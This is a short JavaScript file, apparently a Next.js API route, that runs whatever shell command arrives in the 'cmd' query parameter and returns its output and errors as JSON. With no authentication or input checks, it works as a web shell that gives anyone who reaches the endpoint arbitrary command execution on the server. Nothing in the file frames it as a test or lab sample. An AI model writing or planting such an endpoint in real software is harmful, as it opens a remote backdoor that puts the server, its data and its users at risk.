const exec = require('child_process').spawnSync;

export default function handler(req, res) {

    const { cmd } = req.query
    let p = exec(cmd, { shell: true });
    console.log(p);
    console.log(p.stdout);
    console.log(p.stdout.toString());
    let output = p.stdout.toString();
    let error = p.stderr.toString();
    
    res.status(200).json({ 
        cmd: cmd,
        output: output,
        error: error,
    })
}